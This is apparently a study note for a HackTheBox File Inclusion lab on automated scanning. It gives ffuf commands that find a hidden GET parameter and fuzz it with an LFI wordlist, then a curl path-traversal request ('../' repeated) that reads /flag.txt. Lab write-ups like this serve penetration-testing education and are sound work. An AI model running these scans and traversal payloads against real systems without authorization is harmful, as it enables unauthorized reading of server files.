# NOTE — File Inclusion / Automated Scanning

## ID
600

## Module
File Inclusion

## Kind
lab

## Title
Section 9 — Automated Scanning

## Description
Use ffuf to discover an exposed GET parameter and fuzz it with an LFI wordlist to read /flag.txt via path traversal.

## Tags
lfi, ffuf, fuzzing, path-traversal, parameter-discovery

## Commands
- ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<IP>:<PORT>/index.php?FUZZ=key'
- ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<IP>:<PORT>/index.php?FUZZ=key' -fs <BASELINE_SIZE>
- ffuf -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<IP>:<PORT>/index.php?<PARAM>=FUZZ'
- ffuf -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<IP>:<PORT>/index.php?<PARAM>=FUZZ' -fs <BASELINE_SIZE>
- curl 'http://<IP>:<PORT>/index.php?<PARAM>=../../../../../../../../../../../../../../../../../flag.txt'

## What This Section Covers
Many web applications expose GET parameters that aren't linked to any HTML form, making them invisible to casual users but still exploitable. This section covers using ffuf to first discover those hidden parameters and then fuzz them with dedicated LFI wordlists to identify working path traversal payloads.

## Methodology
1. Run ffuf against `burp-parameter-names.txt` **without** `-fs` first to observe the baseline response size for invalid parameters
2. Re-run the same scan with `-fs <BASELINE>` to filter noise — any result that survives is a valid parameter
3. Run ffuf against `LFI-Jhaddix.txt` on the discovered parameter **without** `-fs` to find the new baseline
4. Re-run with `-fs <BASELINE>` — surviving results are working LFI payloads
5. Use any returned traversal payload to read the target file (prefer the one with the fewest `../` sequences)

## Multi-step Workflow

```bash
# Step 1 — find baseline (note size in output)
ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u 'http://<IP>:<PORT>/index.php?FUZZ=key'

# Step 2 — filter baseline, expose real param
ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u 'http://<IP>:<PORT>/index.php?FUZZ=key' -fs 2309

# Step 3 — find LFI baseline on discovered param
ffuf -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
  -u 'http://<IP>:<PORT>/index.php?view=FUZZ'

# Step 4 — filter and get working payloads
ffuf -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
  -u 'http://<IP>:<PORT>/index.php?view=FUZZ' -fs 1935

# Step 5 — read the flag
curl 'http://<IP>:<PORT>/index.php?view=../../../../../../../../../../../../../../../../../flag.txt'
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Fuzz for exposed parameters, exploit with LFI wordlist to read /flag.txt | HTB{...} | `view` param found via burp-parameter-names.txt; flag read via `../../../../…/flag.txt` traversal from LFI-Jhaddix.txt |

## Key Takeaways
- Always do a **baseline run without `-fs`** first — the error response size varies per app and you can't guess it
- Two-stage fuzzing: parameter discovery first, then LFI payload fuzzing on the confirmed parameter
- `LFI-Jhaddix.txt` bundles traversal bypasses, encoded variants, and null bytes — one scan covers many techniques at once
- Exposed parameters not tied to forms are often less hardened than visible inputs — high-value fuzzing targets
- Prefer payloads with fewer `../` repetitions; they indicate a shallower traversal depth requirement

## Gotchas
- Running LFI fuzzing without `-fs` on the valid parameter produces a new baseline (1935) that differs from the parameter-fuzzing baseline (2309) — filter each stage separately
- `LFI-Jhaddix.txt` path on Pwnbox is `/usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt`, not the `/opt/useful/` path shown in the module text


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|file-inclusion]]  
← [[08-log-poisoning]] | [[10-prevention]] →
<!-- AUTO-LINKS-END -->
